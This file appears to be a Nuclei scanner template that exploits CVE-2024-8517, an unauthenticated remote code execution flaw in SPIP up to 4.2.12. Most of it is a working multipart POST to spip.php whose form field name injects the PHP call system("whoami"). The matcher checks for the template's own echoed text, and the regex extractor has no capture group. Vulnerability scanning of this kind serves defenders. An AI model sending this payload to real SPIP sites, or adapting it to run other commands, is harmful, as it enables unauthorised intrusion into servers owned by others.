id: spip-rce-exploit

info:
  name: SPIP Unauthenticated RCE Exploit
  author: 3p1c0w3nd
  severity: high
  description: |
    Exploits a Remote Code Execution (RCE) vulnerability in SPIP versions up to and including 4.2.12. 
    The vulnerability occurs in SPIPâ€™s templating system, which incorrectly handles user-supplied input, allowing for arbitrary PHP code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-8517
  tags: rce, file-upload, spip

requests:
  - method: POST
    path:
      - "{{BaseURL}}/spip.php"
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------27557867612533913872933463044
      User-Agent: Nuclei
    body: |
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="formulaire_action"

      forum
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="bigup_retrouver_fichiers"

      1
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="a['. system(\"whoami\") . '][]"; filename="a"
      Content-Type: text/plain

      Command injection test
      -----------------------------27557867612533913872933463044
      Content-Disposition: form-data; name="formulaire_action_args"

      test_action_args
      -----------------------------27557867612533913872933463044--
    matchers:
      - type: word
        words:
          - "Command injection test"
        part: body
        condition: contains
    extractors:
      - type: regex
        name: command_output
        group: 1
        regex: 'Command injection test'

